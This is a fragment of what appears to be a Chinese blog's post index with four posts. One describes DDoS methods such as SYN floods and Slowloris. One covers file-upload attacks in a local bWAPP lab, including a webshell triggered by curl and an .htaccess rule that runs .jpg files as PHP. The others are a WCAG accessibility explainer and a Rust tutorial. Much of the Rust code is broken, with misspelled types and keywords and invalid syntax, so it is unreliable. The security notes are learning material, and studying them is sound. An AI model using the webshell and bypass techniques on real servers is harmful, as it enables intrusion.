REPLY，常见的攻击手法有ping\n内存缓存放大攻击：利用UDP的特性（不需要连接），当使用伪造IP对目标服务器发送http请求，目标服务器接收到请求后，发送响应到伪造的IP上，当目标服务器无法处理庞大的请求响应时，将会导致服务器崩溃和带宽饱满\n放大攻击就是利用了请求包和响应包的体积差，发送小的请求包，需要返回大的响应包，从而达到放大攻击的效果\nSYN泛洪攻击和ACK泛洪攻击都是利用TCP的三次握手的特性\nSYN泛洪攻击：伪造IP向目标服务器发送SYN包，目标服务器接收到后返回ACK给伪造IP的机子，但是接收ACK的目标是不存在的，如果不对其进行确认ACK的话，目标服务器将该次连接挂起（半连接状态），目标服务器会重复发送ACK给伪造的IP上，当量大时，挂起的连接将会消耗掉目标服务器的资源，导致其崩溃，从而达到拒绝服务攻击的目的\nACK泛洪攻击：向目标服务器发送大量的ACK数据包，实质理论和SYN泛洪攻击类似\nHTTP泛洪攻击：发送正常的请求，目标服务器需要返回响应，但是这个正常的请求是有针对性的，针对服务器需要消耗大量资源来做出响应的请求，例如搜索请求\nSlowloris攻击：利用HTTP Request的特性，通过\\r\\n\\r\\n来表示HTTP请求发送已完成，当\\r\\n\\r\\n永远不发送时，目标服务器将会保持TCP连接，并且以一种极低速度来发送数据给目标服务器，让目标服务器认为HTTP Request还没有接收完成从而保持TCP连接，当量大时，目标服务器将被占满TCP连接，从而接收不到新的请求，最后达到拒绝服务攻击的目的\n防御Slowloris攻击很简单，限制HTTP Request传输的最大时间，超时将中断连接，并且拉入黑名单\nHTTP Post DDOS攻击：和Slowloris攻击类似，一样是慢速攻击，不过是通过指定一个大的content-length，但是发送包的速度很慢，来达到保持连接，消耗目标服务器的资源\n","permalink":"https://99999.fun/posts/145/","summary":"常见web工具：\nburpsuite：通过代理渗透，可重放HTTP请求，来分析HTTP响应\ncurl：通过url方式传输数据，可用于抓取页面（执行请求），监控网络等等\npostmain\nhackbar quantum\nwappalyzer\n文件上传漏洞：没有足够的安全约束的情况下，允许上传恶意文件，例如恶意脚本，webshell等等\n文件上传漏洞关键点在于绕过\n由于法律限制的原因，禁止对其他网站非法攻击，因此需要在本地或者在自己的服务器上建立靶场渗透环境，这边使用的是bwapp（全称为buggy web Application）\n这边使用的是docker运行bwapp，也可以下载bwapp，来自己搭建（https://sourceforge.net/projects/bwapp/files/）\ndocker pull raesene/bwapp\ndocker run -d -p 0.0.0.0:80:80 raesene/bwapp\n访问127.0.0.1/install.php\n点击here来初始化，或者直接访问127.0.0.1/install.php?install=yes\n创建账号信息，点击new user，或者直接访问127.0.0.1/user_new.php\n点击login，或者直接访问127.0.0.1/login.php，根据刚才的账号信息进行登录\n简单接触文件上传漏洞\nchose your bug选择unrestricted File Upload（未经严格审记的文件上传），安全级别选择low（set your security level）\n上传一句话木马，创建shell.php文件，添加\n通过curl触发，执行curl -d \u0026rsquo;test=echo getcwd();\u0026rsquo; http://127.0.0.1/images/shell.php\n可以看到成功触发shell.php，并且服务器返回了当前执行的目录\n后缀名绕过\n安全级别选择medium（set your security level）\n常见后缀名验证方式有，黑名单（禁止哪些后缀上传），白名单（只允许哪些后缀上传）\n这里的靶场环境的web server为Apache，因此需要了解Apache解析器模块\n.htaccess绕过，当黑名单没有限制上传.htaccess文件时，并且web sever也支持.htaccess时\n上传.htaccess文件，内容为：AddType application/x-httpd-php jpg\n上传木马，shell.jpg\nAddType application/x-httpd-php jpg的意思是，jpg文件按照php文件的方式解析\n大小写绕过\n大小写用于Windows平台环境下，在Windows中，大小写是不敏感的，而在Linux环境下，大小写是敏感的\nWindows文件流绕过\n利用windows平台的NTFS文件系统的文件流特性，设置文件时，默认使用未命名的文件流，但是也可以创建其他命名的文件流\n例如：\necho hallo,word \u0026gt; hallo.txt:a.txt\recho hallo \u0026gt; hallo.","title":"web安全学习笔记"},{"content":"a11y全称为Accessibility，A到y之间有11个字母，因此叫a11y，Accessibility中文翻译为可访问性，也就是无障碍\n让网站具备无障碍性，可以让一些视觉障碍人士访问该网站，而且就算是其他人士使用，也会因a11y而受益（不因网络慢，css文件丢失而无法正常浏览页面内容）\n在mdn上有句话：The Web is fundamentally designed to work for all people, whatever their hardware, software, language, culture, location, or physical or mental ability. When the Web meets this goal, it is accessible to people with a diverse range of hearing, movement, sight, and cognitive ability.\nw3c发布了Web内容无障碍指南 (WCAG) https://www.w3.org/Translations/WCAG21-zh/\n妨碍障碍人士访问web页面常见是视觉障碍，一般需要使用放大镜或者屏幕缩放来访问，严重的可能需要使用屏幕阅读器\n常见的屏幕阅读器有：NVDA（windows），ChromeVox（Chrome浏览器内置），Narrator（windows内置，也就是我们说的讲述人），VoiceOver（苹果家的，像MacOS，ios，ipadOS都内置了），TalkBack（安卓内置），以及Orca（Linux内置）\nmdn对于障碍人士可访问性优化提供了建议：\n1.使用多种方式传达内容，比如从文本到语音或是视频； 2.更易理解的内容，例如使用更通俗的语言书写的文本； 3.将注意力集中在重要内容上； 4.尽量减少干扰，例如不必要的内容或广告； 5.一致的网页布局和导航； 6.相似的元素，比如未访问的下划线链接使用蓝色而访问过的使用紫色； 7.将过程划分为更有逻辑的，必要的步骤并附上进度指示器； 8.在不影响安全性的情况下尽可能让网站认证更简单；并且 9.使表单容易完成，例如带有清晰的错误消息和简单的错误恢复。\n而WCAG指南也提供了建议：\n可感知性（Perceivable）：非文本内容有文本替代，对于视频内容应该提供字幕，确保视感和听感都可浏览，不会因为某些原因导致信息或者结构（可以理解为文本顺序）丢失，应该具备可辨别性（颜色不应该作用区别视觉的唯一手段（针对色盲人士））\n可操作性（Operable）：页面可通过键盘来操作，而不是唯一依赖于鼠标，提供足够的时间来阅读和使用内容（比如定时可调整，关闭定时，延长定时等等），防癫痫（不使用会诱发癫痫的设计，例如控制闪光的次数），提供导航，查找以及提供内容位置，允许使用键盘之外的设备输入（例如鼠标或者手写板）\n可理解性（Understandable）：内容应该都是可读，可被理解的（例如设置多种人类语言，比如英文，中文，日文等等，根据操作系统使用语言或者时区设置为默认语言，语言可切换），任何操作都应该具备可预见性（例如关闭一个弹窗，不会导致其他意想不到的情况发生），当输入出现问题应该提示用户哪错了（例如注册时，密码的组合程度等等），当出现用户操作出错时，应该做到操作可逆或者二次确定操作（给予用户检查和纠正的机会）\n鲁棒性（Robust）：应该在发生某一些系统故障或者网络故障时，确保还能正常工作，而不是罢工或者出错，鲁棒性又叫抗干扰性，健壮性\n","permalink":"https://99999.fun/posts/144/","summary":"a11y全称为Accessibility，A到y之间有11个字母，因此叫a11y，Accessibility中文翻译为可访问性，也就是无障碍\n让网站具备无障碍性，可以让一些视觉障碍人士访问该网站，而且就算是其他人士使用，也会因a11y而受益（不因网络慢，css文件丢失而无法正常浏览页面内容）\n在mdn上有句话：The Web is fundamentally designed to work for all people, whatever their hardware, software, language, culture, location, or physical or mental ability. When the Web meets this goal, it is accessible to people with a diverse range of hearing, movement, sight, and cognitive ability.\nw3c发布了Web内容无障碍指南 (WCAG) https://www.w3.org/Translations/WCAG21-zh/\n妨碍障碍人士访问web页面常见是视觉障碍，一般需要使用放大镜或者屏幕缩放来访问，严重的可能需要使用屏幕阅读器\n常见的屏幕阅读器有：NVDA（windows），ChromeVox（Chrome浏览器内置），Narrator（windows内置，也就是我们说的讲述人），VoiceOver（苹果家的，像MacOS，ios，ipadOS都内置了），TalkBack（安卓内置），以及Orca（Linux内置）\nmdn对于障碍人士可访问性优化提供了建议：\n1.使用多种方式传达内容，比如从文本到语音或是视频； 2.更易理解的内容，例如使用更通俗的语言书写的文本； 3.将注意力集中在重要内容上； 4.尽量减少干扰，例如不必要的内容或广告； 5.一致的网页布局和导航； 6.相似的元素，比如未访问的下划线链接使用蓝色而访问过的使用紫色； 7.将过程划分为更有逻辑的，必要的步骤并附上进度指示器； 8.在不影响安全性的情况下尽可能让网站认证更简单；并且 9.使表单容易完成，例如带有清晰的错误消息和简单的错误恢复。\n而WCAG指南也提供了建议：\n可感知性（Perceivable）：非文本内容有文本替代，对于视频内容应该提供字幕，确保视感和听感都可浏览，不会因为某些原因导致信息或者结构（可以理解为文本顺序）丢失，应该具备可辨别性（颜色不应该作用区别视觉的唯一手段（针对色盲人士））\n可操作性（Operable）：页面可通过键盘来操作，而不是唯一依赖于鼠标，提供足够的时间来阅读和使用内容（比如定时可调整，关闭定时，延长定时等等），防癫痫（不使用会诱发癫痫的设计，例如控制闪光的次数），提供导航，查找以及提供内容位置，允许使用键盘之外的设备输入（例如鼠标或者手写板）\n可理解性（Understandable）：内容应该都是可读，可被理解的（例如设置多种人类语言，比如英文，中文，日文等等，根据操作系统使用语言或者时区设置为默认语言，语言可切换），任何操作都应该具备可预见性（例如关闭一个弹窗，不会导致其他意想不到的情况发生），当输入出现问题应该提示用户哪错了（例如注册时，密码的组合程度等等），当出现用户操作出错时，应该做到操作可逆或者二次确定操作（给予用户检查和纠正的机会）\n鲁棒性（Robust）：应该在发生某一些系统故障或者网络故障时，确保还能正常工作，而不是罢工或者出错，鲁棒性又叫抗干扰性，健壮性","title":"简单了解a11y无障碍"},{"content":"Rust由非盈利组织Mozilla基金会开发，像著名的Mozilla Firefox浏览器和MDN Web Docs都出自该基金会\n安装\n官方推荐使用Rustup来安装（Rustup是rust的安装器和版本管理工具）\n通过rustup-init来安装Rust\nhttps://www.rust-lang.org/zh-CN/tools/install\nwindows直接安装pustup-init.exe来安装（需联网）,默认通过vc安装，建议选择2自定义安装\nLinux或者macOS则直接执行以下命令\ncurl \u0026ndash;proto \u0026lsquo;=https\u0026rsquo; \u0026ndash;tlsv1.2 -sSf https://sh.rustup.rs | sh\n注意：Rust的一些包，可能还依赖C编译器，因此最好安装一下GCC\n检查是否安装完成\nrustc \u0026ndash;version\n如果喜欢用Visual Studio Code开发，可搭配rust-analyzer插件来使用\n更新rust\nrustup update\n卸载rust和rustup\nrustup self uninstall\n在安装rustup的同时也会安装Cargo\nCargo是rust的项目构建工具和包管理器\n检查是否安装成功\ncargo \u0026ndash;version\n创建第一个rust项目\ncargo new halloword\n其中Cargo.toml文件是项目的依赖库文件\n通过编辑Cargo.toml文件来添加依赖\nrust依赖可通过https://crates.io/查找\n[package]\rname = \u0026quot;hallo_word\u0026quot;\rversion = \u0026quot;0.0.1\u0026quot;\redition = \u0026quot;2021\u0026quot;\r[dependencies]\rhyper = \u0026quot;0.14.20\u0026quot; # 来自https://crates.io/\r# hyper = { git = \u0026quot;https://github.com/hyperium/hyper\u0026quot; } # 来自第三方社区\r# hyper = { path = \u0026quot;../hyper\u0026quot; } # 来自本地文件\r构建依赖到项目中\ncargo build halloword\n当构建完成后，会在项目的根目录中创建一个名叫Cargo.lock的文件，该文件记录项目依赖的版本\nsrc/main.rs是该项目的程序编写文件\n在src/main.rs添加以下内容\nfn main() {\rprintln!(\u0026quot;hallo, world\u0026quot;);\r};\r进入该项目根目录运行该项目\ncargo run\n或者直接编译main.rs\nrustc main.rs ./main\n注意：在windows上，需要加.exe，.\\main.exe\n在hallo word例子中看到，fn是创建函数的关键字，main是函数名，该函数调用了println!()，其实这是一个macro（宏），\u0026ldquo;hallo, world\u0026quot;作为字符串参数传递到了该宏中\n另外cargo提供了一个命令，来不用生成二进制文件的前提下构建项目，来检查项目的错误\ncargo check\nbuild和run默认是debug版本的，如果需要编译release版本执行cargo build \u0026ndash;release\n在rust中函数是一等公民，其中main函数是程序的入口函数（和golang一样）\n注释可以让rust编译器忽略，例如：// hallo word\n多行注释可使用块注释，例如：\n/*\rhallo\rword\r*/\r文档注释，行注释例如：\n/// 1\r/// 2\r/// 3\r文档块注释，例如：\n/**\rhallo\rword\r*/\r注意：文档注释必须位于lib类型的包中，文档注释看使用md语法\n可使用cargo doc命令，来对文档注释生成html文件，放在target/doc目录下，也可以使用 cargo doc \u0026ndash;open 生成文档后自动打开html网页\n变量通过let关键字来创建\nfn main() {\rlet mut abc = \u0026quot;hallo word\u0026quot;;\rabc = \u0026quot;hhh\u0026quot;;\rprintln!(\u0026quot; abc: {}\u0026quot;,abc);\r};\r注意：rust变量默认是不能变得，需要通过mut关键字来让变量可变\n变量存在遮蔽性，如果使用let关键重复声明同一个变量，会遮蔽之前声明的变量的值和类型\n变量的遮蔽性和mut关键字的区别是，mut关键字无法修改变量的类型，mut关键字修改的只能是相同类型的值\n常量通过const关键字来创建\nfn main() {\rconst ABC = \u0026quot;hallo word\u0026quot;;\rprintln!(\u0026quot; ABC: {}\u0026quot;,ABC);\r};\r常量不可变，也不能使用mut，而且必须声明类型（字面量也算是一种类型声明）\n数据类型\nrust是静态型编译语言，因此需要在编译之前就知道全部变量的类型\nrust有4大基础类型，这个基础类型又叫标量类型，分别是整型，浮点型，布尔型，字符型\n整型就是没有小数的整数（分符号类型和无符号类型，区别是是否为负数，可能为负数使用有符号类型，不可能为负数使用无符号类型）\n整型使用u表示无符号类型，用i表示有符号类型，再声明使用多少位的空间，例如i32，就是占32位空间的有符号类型\n还有2个特殊的类型，isize和usize，这个类型取决程序执行环境的系统架构，使用64位架构就是占64位空间\n整型支持十进制，八进制，二进制，十六进制和字节，rust默认使用i32类型\n注意：使用有符号类型会将以二进制补码的方式来存储\n浮点类型，就是带小数的数字，rust的浮点型有2个类型，分别是f32和f64，默认是f64，f64是双精度浮点型，f32类型是单精度，并且全部类型都是具备符号的（可为负数）\n布尔类型，布尔类型只能是这2个值得其中之一，true和false，布尔类型使用bool关键字来声明，例如 let a: bool = true;,当然也是可以使用字面量来声明\n字符类型，字符类型使用单引号包括，并且只能表示一个Unicode字符（因为字符类型只使用4个字节）\n字符串类型使用双引号表示，可表示多个字符，使用String表示，例如：\nlet a:String = \u0026quot;hallo word\u0026quot;;\rprinln!(\u0026quot;{}\u0026quot;,a);\r除了标量类型外还有复合类型，复合类型有6种，分别是元组和数组，枚举，结构体，字符串，切片\n元组类型就是无法扩展和收缩的数组（元组可使用不同的类型），长度是固定的，例如：\nlet a: (i64, f64) = (100,3.14);\r获取元组的元素可通过解构的方式来完成，例如：\nlet a: (i64, f64) = (100,3.14);\rlet (b,c) = a;\r也可以通过索引值来获取，例如：\nlet a: (i64, f64) = (100,3.14);\rlet b = a.1;\r元组的索引是从0开始的\n数组类型和元组不同，数组的类型必须是相同类型的，数组长度也是固定的\nlet a = [1,233,666];\rrust也提供了动态数组（vector），动态数组将被分配到堆内存空间，而普通数组会被分配到栈内存空间\n动态数组使用Vec的方式来声明，动态数组也不能使用不同的类型，但是动态数组可以扩展空间和缩小，而且全部元素在内存是相邻排列的，可使用Vec::new()来创建一个空的动态数组，例如：\nlet a: Vev\u0026lt;u64\u0026gt; = Vec::new();\r当然也可以提供初始值来创建\nlet b = vec![2,4,68];\rrust可以根据字面量来自动推断出类型\n动态数组增加元素使用push方法，例如：\nlet mut a: Vev = Vec::new()； a.push(1); a.push(2); a.push(3); a.push(4); a.push(5);\n注意：动态数组离开当前作用域会被丢弃销毁\n获取动态数组的元素，可通过get方法或者索引来完成，例如：\nlet a = vec![2,4,68];\rlet b = a.get(2);\rlet c = \u0026amp;a[2];\rget方法和索引的区别是，get方法访问超过数组不存在的元素是不会报错的，而是返回none，而索引访问是会导致报错，程序崩溃的\n遍历动态数组\nlet a = vec![2,4,68];\rfot i in \u0026amp;a{\rprintln!(\u0026quot;{}\u0026quot;,i);\r};\r动态数组支持枚举类型，这可以让动态数组存储不同类型的值，例如；\nenum Hallo{\rInt(i64),\rText(String),\r};\rlet a = vec![\rHallo::Int(666),\rHallo::Text(Sting::from(\u0026quot;hallo word\u0026quot;)),\r];\r函数，是rust的第一个公民，main函数是rust程序入口文件，而且函数定义可在main函数之前或者之后，使用fn关键字来声明，例如：\nfn hallo_word(){\rprintln!(\u0026quot;hallo word\u0026quot;);\r};\rfn main(){\rhallo_word();\r};\r函数参数\nfn main(){\ra(666);\r};\rfn a(x:i64){\rprintln!(\u0026quot;{}\u0026quot;,x);\r};\r函数返回值\nfn main(){\ra(666);\r};\rfn a(x:i64) -\u0026gt;{\rx+123\r};\r注意：返回值使用-\u0026gt;返回，而且不能使用分号，因为语句无法作为返回值返回\nif判断\nlet a = 1;\rif a \u0026lt;10{\rprintln!(\u0026quot;true \u0026gt;10\u0026quot;);\r}else if(a\u0026gt;0){\rprintln!(\u0026quot;true \u0026gt;10\u0026quot;);\r}else{\rprintln!('none')\r};\r注意：if判断必须提供一个布尔类型的值，否则会抛出错误\n表达式是可以赋值给变量的，例如：let boola = true; let a = if boola{1} else{2}\nrust的循环有3种，分别是for，while，以及loop\nfor遍历循环（常用于遍历集合元素），例如：\nlet a = [1,2,3,45,6];\rfor b in a {\rprintln!(\u0026quot;{}\u0026quot;,b);\r};\rwhile循环，条件为真执行，为假停止循环。例如：\nlet mut a = 0\rwhile a \u0026lt;= 10{\rprintln!(\u0026quot;hallo wrod\u0026quot;);\ra +=1;\r};\rloop关键字可以一直执行语句，直到被跳出（可使用break关键字），例如：\nlet mut count = 0;\rloop{\rprintln!(\u0026quot;hallo word\u0026quot;);\rif (count == 5){\rbreak;\r};\rcount +=1;\r};\rloop循环可以搞个标签，来指定终止哪次循环（嵌套循环下），例如：\u0026lsquo;a\u0026rsquo;: loop{ break \u0026lsquo;a\u0026rsquo;}\ncontinue操作符可跳出当前循环，去执行下次循环，一般搭配if分支语句来使用\n所有权\n所有权是rust的特性之一，无需gc垃圾回收机制就可以保证内存安全\n作用域是一个语句块在程序中有效的范围，在该范围内的变量是有效的，离开该范围后将自动释放内存空间\n释放内存空间是使用rust提供的一个叫drop函数，会在结尾}自动调用该函数\n当一个变量的值是指针时，赋值给另一个变量，当这2个变量离开作用域后，会导致二次释放，因为这2个变量指向的是同一个内存空间地址，二次释放会导致内存污染，这个指针实质上是在堆上的\nrust为了解决二次释放导致的内存安全问题，当一个存在指针值的变量赋值给另一个变量后，会销毁第一个变量，而无需再等到离开作用域，第一个变量将变成是无效的，这个赋值将不是复制，而是剪切板一样，移动数据\n如果需要复制堆的数据，可使用clone方法，例如：\nlet a = String::from(\u0026quot;hallo word\u0026quot;);\rlet b = a.clone();\rprintln!(\u0026quot;{},{}\u0026quot;a,b);\r注意：移动数据只针对栈上的指针之类的有效，如果是赋值的是整型之类存在在栈上的，是不需要移动，因为复制指针这些\u0026quot;引用类型\u0026quot;需要耗费性能，rust通过copy trait标注来决定是否赋值给其他变量后，这个变量是否还有效，只要类型实现了copy trait就可以\n支持copy trait的类型：全部整数类型，布尔类型，浮点类型，字符类型，元组（部分类型支持）\n为了避免需要引用变量而导致原变量失效，rust提供了引用功能，例如：\nlet a = String::from(\u0026quot;hallo word\u0026quot;);\rlet b = \u0026amp;a;\r引用不会具备该值的所有权，但是可以指向这个值\n引用实质上是借用的，是不能修改借用的值，如果想修改可提前对具备所有权的变量声明mut可变，例如：\nlet mut a = String::from(\u0026quot;hallo\u0026quot;);\rlet b = \u0026amp;mut a;\r注意：同一个作用域中只能有一个对这个数据进行可变引用，使用多个可变引用会报错，这是为了避免竞争\n切片类型也是没有所有权的，对切片类型进行操作，是不会影响到原来的值，例如：\nlet a = String::from(\u0026quot;hallo world\u0026quot;);\rlet hello = \u0026amp;a[0..5];\rlet world = \u0026amp;a[6..11];\ra.clear();\r结构体与元组一样，元素可以是多个类型，但是和元组不同的是，结构图具备元素别名，并且使用struct来定义结构体，例如：\nstruct Name{\rid: i64,\rusername: String,\remail: String,\rpass: String,\r};\r上面例子就是一个结构体，这个结构体的名称叫Name，具备4个字段，每个字段有自己对于的字段名称和类型\n有结构体当然也有结构体实例，结构体是结构体实例的抽象\nlet name1 = Name{\rid: 1,\rusername: String::from(\u0026quot;root\u0026quot;),\remail: String::form(\u0026quot;a@xiaochenabc123.test.com\u0026quot;),\rpass: String::form(\u0026quot;123456789\u0026quot;),\r};\rprintln!(\u0026quot;hallo {}\u0026quot;, name1.username);\rname1.email = String::from(\u0026quot;b@xiaochenabc123.test.com\u0026quot;);\r注意：结构体实例必须按照结构体每个字段的类型要求进行初始化，不需要按照结构体声明的字段顺序一样\n利用函数返回值来完成结构体的实例化，例如：\nfn NameTest(username: String, email: String, pass: String) -\u0026gt;{\rName{\rusername,\remail,\rpass,\r};\r};\rfn main(){\rlet name01 = NameTest(\u0026quot;user01\u0026quot;,\u0026quot;test@xiaochenabc123.test.com\u0026quot;,\u0026quot;12356987\u0026quot;);\rprintln!(\u0026quot;hallo {}\u0026quot;, name01.username);\r};\r基于已有的实例，创建新的实例，例如：\nlet name2 = Name{\rusername: String::from(\u0026quot;uesr02\u0026quot;),\r..name01\r};\r注意：其中..name01是表示其他字段将从name01实例中获取\n元组结构体（结构体字段没名称的就叫元组结构体）\nstruct Abc(i64,bool,f64);\rlet abc1 = Abc(100,true,3.14);\r单元结构体（这玩意和go的空结构体一样，只定义一个结构体，但是没有字段和属性）\nstruct Xyz;\rlet xyz1 = Xyz;\r结构体的所有权：当使用已有的实例，创建新的实例时，改变的字段的所有权将会被转移到新的实例，原有的实例的那个字段将失效，其他字段正常，因此使用结构体应该避免使用引用类型\n枚举\nenum HomeTest{\rHallo,\rXyz,\rAbc,\rHahaha(i64)\r};\rstruct Demo{\rhome: HomeTest,\rid: i64,\r}\rfn main(){\rlet test1 = HomeTest::Hallo;\rlet test2 = HomeTest::Abc;\rprintln!(test1);\rprintln!(test2);\rlet a = Demo{\rhome: HomeTest::Abc,\rid: 1,\r}\rlet b = Demo{\rhome: HomeTest::Hallo,\rid: 2,\r}\r}\r上面例子中，通过enum关键字声明并且定义一个枚举类型，这个枚举类型有3个枚举成员，通过::操作符来访问枚举的成员，枚举是一种类型，因此可用于函数参数类型，结构体类型等等\n枚举的成员可以是任何类型的数据，也可以限制成员的数据类型，结构体使用{}，单个使用()，多个可使用逗号分割\nrust的空值使用Option枚举类型来表示，而不是null\nOption，Some，None都包含在prelude标准库中，不需要在源码中声明，或者引用，直接就可以使用\nOption枚举类型的实现\nenum Option\u0026lt;T\u0026gt; {\rSome(T),\rNone,\r};\r表示一个空值\nlet null1: Option\u0026lt;i64\u0026gt; = None;\r如果使用None，则需要提前提供是什么类型，因为无法通过None来推断出类型\nOption比null好的原因是，Option(T)和任何类型都不相同，无法将Option和i64类型的值进行处理\n如果有值则：\nlet num1:Option \u0026lt;i64\u0026gt; = Some(233);\r如果使用Some，表示有个值存于Some中\n使用Option枚举类型：\nfn Test(a:Option\u0026lt;i64\u0026gt;) -\u0026gt; Option\u0026lt;i64\u0026gt; {\rmatch a {\rSome(i) =\u0026gt; Some(i),\rNone =\u0026gt; None,\r}\r}\rlet abc = Some(666);\rlet xyz = Test(abc);\r上面例子中，通过Test函数传入一个Option类型的参数，并且返回一个Option类型的值，使用match模式匹配，如果传入None则返回None，传入Some(i64)，则返回其本身（也就是Some(i64)）\n模式匹配\nmatch语句\nenum Demo{\rHallo,\rAbc,\rXyz,\r};\rlet test1 = Demo::Xyz;\rlet test2 = match test1 {\rDemo::Hallo =\u0026gt; \u0026quot;hallo word\u0026quot;,\rDemo::Abc | Demo::Xyz =\u0026gt; \u0026quot;hallo abcxyz\u0026quot;,\r},\r_ =\u0026gt;\u0026quot;0\u0026quot;,\r};\r上面例子中进行匹配Demo对应的枚举类型，match会穷尽列出全部已知的可能，如果存在不知道的可能，使用下划线_来表示，match语句与switch语句很像，match的分支必须指向一个表达式，而且每个分支的表达式结果必须是相同类型的\n假如只想对单个模式来进行处理，可使用if let语句，例如：\nlet test1 = Demo::Xyz;\rif let Test2(Demo::Xyz) = test1{\rprintln!(\u0026quot;hallo wrod\u0026quot;);\r}\r上面例子中，如果匹配到Demo::Xyz，输出hallo wrod，如果不匹配则忽略\n注意：match和if let会在模式匹配时进行覆盖老值，绑定新的值\nmatches!宏匹配，可以将一个表达式和模式来进行匹配，返回结果是布尔值，例如：\nlet a = 1;\rassert!(matches!(1..100 | -1..-100));\r方法\nrust使用impl关键字来定义方法\nstruct Demo {\rid: i64,\ruser: String,\r}\rimpl Demo {\rfn new(id: i64, user: String) -\u0026gt; Demo {\rDemo{\rid: id,\ruser: user,\r}\r}\rfn printa(\u0026amp;self){\rprintln!(self.user)\r}\r}\rfn mian(){\rlet a = Demo{\rid: 1,\ruser: \u0026quot;root\u0026quot;,\r}\ra.printa()\r}\r\u0026amp;self为借用Demo结构体，new函数是Demo方法的关联函数，用于初始化结构体实例\n\u0026amp;self是self: \u0026amp;Self的简写，self有所有权，而\u0026amp;self是表示不可变借用，\u0026amp;mut self就是可变借用\nimpl Demo是struct Demo的实现，另外rust允许方法名与结构体的字段名相同，调用方法加()，否则就是在访问字段\nrust自动引用和解引用：当一个对象调用方法时，会自动为该对象添加\u0026amp;，\u0026amp;mut，*来确保该对象能与方法匹配\n关联函数：当一个存在于impl中，但是没有使用self的函数就被叫关联函数，通常存在impl中的new函数是结构体的构造实例器（rust没有使用new作为关键字，并不强制使用new）\n关联函数因为不是方法，需要使用::来调用，例如Demo::new(2,\u0026ldquo;admin\u0026rdquo;)\nrust允许将结构体定义成多个impl块，而不需要全部都写到一块，更灵活扩展\n枚举类型也可被实现\n泛型与特征\n泛型，当需要对可能存在不同类型的数据处理，但是处理逻辑是一样时，可使用泛型来避免重复，例如：\nfn test\u0026lt;T: std::ops::Add\u0026lt;Output = T\u0026gt;\u0026gt;(a:T, b:T) -\u0026gt; T {\ra + b\r}\rfn mian(){\rprintln!(\u0026quot;{}\u0026quot;,test(1,2));\rprintln!(\u0026quot;{}\u0026quot;,test(3.14,1.23));\r}\r注意：T是泛型参数，泛型参数是可自定义的，不过一般都是用T（表示Type），T可以表示任何类型，但是不是所有类型可以进行比较运算处理的，需要通过特征（这里是\u0026lt;T: std::ops::Add\u0026lt;Output = T\u0026gt;）来限制T的类型\n结构体泛型\nstruct Demo\u0026lt;T\u0026gt;{\ra: T,\rb: T,\r}\rfn main(){\rlet x = Demo{a: 1,b: 21};\rlet y = Demo{a: 1.23, b: 3.14};\rlet z = Demo{a: \u0026quot;hallo word\u0026quot;, b: \u0026quot;hahaha\u0026quot;}\r}\r注意：结构体中使用T泛型的，必须是相同类型，因为第一个字段被赋值，会推断T类型为该赋值的实质类型，因此会报错的\n如果想使用类型不同，又想使用泛型，可使用多个泛型参数来分别表示不同的类型\n枚举泛型，Option枚举类型就是使用了泛型的，这里就不写了\n方法泛型，例如：\nstruct Demo\u0026lt;T, U\u0026gt; {\rid: T,\ruser: U,\r}\rimpl\u0026lt;T,U\u0026gt; Demo\u0026lt;T,U\u0026gt; {\rfn new(id: T, user: U) -\u0026gt; Demo\u0026lt;T,U\u0026gt; {\rDemo{\rid: id,\ruser: user,\r}\r}\rfn printa(\u0026amp;self){\rprintln!(self.user)\r}\r}\r注意：使用泛型参数必须在提前声明\nconst泛型（Rust 1.51 版本引入）\nconst泛型是针对值的泛型，而不是针对类型，例如：\nfn Demo\u0026lt;T: std::fmt::Debug,const U:i64\u0026gt;(a:[T; U]){\rprintln!(\u0026quot;{:?}\u0026quot; a)\r}\rfn main(){\rlet a: [i64:5] = [0,123,666,888,987];\rDemo(a)\rlet a: [i64:2] = [0,123];\rDemo(a)\r}\rrust在编译阶段会对泛型的多个类型生成独立的代码（单态），会牺牲一些编译完成文件的大小和编译速度\n特征\n声明一个特征使用trait关键字，例如：\npub trait Demo {\rfn DemoTest(\u0026amp;self);\r}\r实现一个特征\npub struct Home {\rpub user: String,\rpub pass: String,\r}\rimpl Demo for Home {\rfn DemoTest(\u0026amp;self) -\u0026gt; String {\rformat!(\u0026quot;用户是{},密码是{}\u0026quot;,self.user,self.pass);\r}\r}\rpub struct Abc {\rpub admin: String,\rpub rank: String,\r}\rimpl Demo for Abc {\rfn DemoTest(\u0026amp;self) -\u0026gt; String {\rformat!(\u0026quot;管理者是{},管理等级是{}\u0026quot;,self.admin,self.rank);\r}\r}\rfn main() {\rlet home1 = Home{user: \u0026quot;xiaochen\u0026quot;,padd: \u0026quot;abc123456789\u0026quot;};\rlet xyz = Abc{admin: \u0026quot;main\u0026quot;,rank: \u0026quot;max\u0026quot;};\rprintln!(\u0026quot;{}\u0026quot;,home1.DemoTest());\rprintln!(\u0026quot;{}\u0026quot;,xyz.DemoTest());\r}\r从上面的例子中可以看出，特征是定义了一种行为，实现该特征就可使用该行为，特征和结构体，枚举类型是很像的，但是特征可被共享到每个实现上（因为rust没有继承概念，但是行为/方法是相同的）\n注意：特征存在一种规则，想实现一个特征必须至少一个是在当前作用域定义的，这个规则是为了避免不会破坏特征和实现的定义\n默认实现（无需实现该方法，默认使用该实现，也可对默认实现进行重载）\npub trait Demo {\rfn DemoTest(\u0026amp;self) -\u0026gt; String {\rString::form(\u0026quot;hallo wrod\u0026quot;);\r}\r}\r只要在实现中没有重载该方法，就会使用默认实现\n特征作为函数参数\npub fn Demo1(data: \u0026amp;impl Demo){\rprintln!(\u0026quot;{}\u0026quot;,data.DemoTest());\r}\r在上面例子中，data函数参数实现了Demo特征，当然也可以使用其他实现了Demo特征的类型来作为参数\n特征约束\npub fn Demo2\u0026lt;T: Demo\u0026gt; (data: \u0026amp;T){}\r上面例子就是特征约束，特征约束可限制函数参数必须是实现了Demo特征的类型\n多重约束\npub fn Demo3\u0026lt;T: Demo + AbcTest\u0026gt; (data: \u0026amp;T){}\r或者\npub fn Demo3(data: \u0026amp;(impl Demo + AbcTest)){}\r上面例子就是多重约束，可限制参数必须使用Demo特征，还必须实现AbcTest特征\nWhere 约束（简写多重约束）\npub fn Demo4\u0026lt;T\u0026gt;(data: \u0026amp;T) -\u0026gt; String\rwhere T: Demo + AbcTest,\r{}\r特征约束高级应用\nimpl \u0026lt;T:Dome1 + Dome2\u0026gt; Demo\u0026lt;T\u0026gt; {\rfn Test1(\u0026amp;self){\rprintln!(\u0026quot;hallo word\u0026quot;);\r}\r}\r上面例子中，只有实现了Dome1特征和Dome2特征的Demo才拥有Test1方法\nimpl 